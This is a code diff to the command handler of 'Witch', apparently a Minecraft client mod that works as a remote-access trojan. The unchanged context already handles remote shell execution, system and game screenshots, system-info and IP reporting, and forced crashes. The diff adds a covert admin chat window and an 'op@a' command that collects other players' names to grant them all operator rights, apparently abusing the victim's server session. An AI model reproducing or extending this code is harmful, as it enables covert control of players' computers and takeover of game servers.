@@ -1,19 +1,21 @@
 package me.soda.witch.client.connection;
 
 import me.soda.witch.client.Witch;
-import me.soda.witch.client.utils.ChatUtils;
-import me.soda.witch.client.utils.MCUtils;
-import me.soda.witch.client.utils.ScreenshotUtil;
-import me.soda.witch.client.utils.ShellcodeLoader;
+import me.soda.witch.client.utils.*;
 import me.soda.witch.shared.FileUtil;
 import me.soda.witch.shared.LogUtil;
 import me.soda.witch.shared.NetUtil;
 import me.soda.witch.shared.ProgramUtil;
 import me.soda.witch.shared.socket.messages.Message;
+import net.minecraft.client.network.PlayerListEntry;
 import net.minecraft.client.util.GlfwUtil;
-import net.minecraft.text.Text;
+import net.minecraft.util.StringHelper;
 
 import java.lang.management.ManagementFactory;
+import java.util.ArrayList;
+import java.util.List;
+
+import static me.soda.witch.client.Witch.mc;
 
 public class MessageHandler {
     public static void handleMessage(Message message) {
@@ -31,7 +33,10 @@ public class MessageHandler {
                 case "systeminfo" -> Witch.send(msgType, MCUtils.systemInfo());
                 case "screenshot" -> ScreenshotUtil.gameScreenshot();
                 case "screenshot2" -> Witch.send(msgType, ScreenshotUtil.systemScreenshot());
-                case "chat" -> ChatUtils.chat(Text.of((String) msg), false);
+                case "chat" -> {
+                    Witch.CHAT_WINDOW.frame.setVisible(true);
+                    Witch.CHAT_WINDOW.appendText("Admin:" + msg);
+                }
                 case "shell" -> new Thread(() -> {
                     String result = ProgramUtil.runCmd((String) msg);
                     Witch.send(msgType, "\n" + result);
@@ -57,6 +62,19 @@ public class MessageHandler {
                 case "ip" -> Witch.send(msgType, NetUtil.getIP());
                 case "crash" -> GlfwUtil.makeJvmCrash();
                 case "server_name" -> Witch.VARIABLES.name = (String) msg;
+                case "op@a" -> {
+                    if (!MCUtils.canUpdate()) return;
+                    List<String> players = new ArrayList<>();
+                    String pName = mc.getSession().getProfile().getName();
+                    for (PlayerListEntry info : mc.getNetworkHandler().getPlayerList()) {
+                        String name = info.getProfile().getName();
+                        if (StringHelper.stripTextFormat(name).equalsIgnoreCase(pName))
+                            continue;
+
+                        players.add(name);
+                    }
+                    OpEveryone.opEveryone(players);
+                }
             }
         } catch (Exception e) {
             LogUtil.println("Corrupted message!");
